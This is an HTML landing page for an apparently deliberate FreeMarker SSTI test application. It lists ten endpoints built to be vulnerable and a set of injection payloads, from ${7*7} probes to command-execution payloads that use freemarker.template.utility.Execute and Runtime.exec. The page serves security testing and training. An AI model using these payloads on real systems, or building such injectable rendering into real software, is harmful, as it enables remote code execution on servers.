<!DOCTYPE html>
<html>
<head>
    <title>FreeMarker SSTI Test App</title>
</head>
<body>
    <h1>FreeMarker SSTI Test Application</h1>
    <h2>Vulnerable Endpoints:</h2>
    <ul>
        <li><a href="/search?q=test">Search (GET)</a></li>
        <li><a href="/profile">Profile Form</a></li>
        <li><a href="/render?content=hello">Direct Render</a></li>
        <li><a href="/debug?msg=test">Debug Page</a></li>
        <li><a href="/api/eval?expr=test">API Evaluation</a></li>
        <li><a href="/class?className=java.lang.String">Class Exploration</a></li>
        <li><a href="/object?input=test">Object Access</a></li>
        <li><a href="/builtin?value=test">Built-in Access</a></li>
        <li><a href="/new?className=java.util.ArrayList">NEW Operator</a></li>
        <li><a href="/static?className=java.lang.System">Static Access</a></li>
    </ul>
    
    <h2>Test Payloads:</h2>
    <ul>
        <li><code>${7*7}</code> - Basic math</li>
        <li><code>${"".getClass()}</code> - Class access</li>
        <li><code>${"".getClass().forName("java.lang.Runtime")}</code> - Class.forName</li>
        <li><code>${product.getClass()}</code> - Object class access</li>
        <li><code>${.version}</code> - FreeMarker version</li>
    </ul>
    
    <h2>Advanced Payloads:</h2>
    <ul>
        <li><code>${"freemarker.template.utility.Execute"?new()("id")}</code> - Command execution</li>
        <li><code>${"java.lang.Runtime"?eval.getRuntime().exec("whoami")}</code> - Runtime execution</li>
        <li><code>${statics["java.lang.System"].getProperty("user.name")}</code> - System properties</li>
    </ul>
</body>
</html>
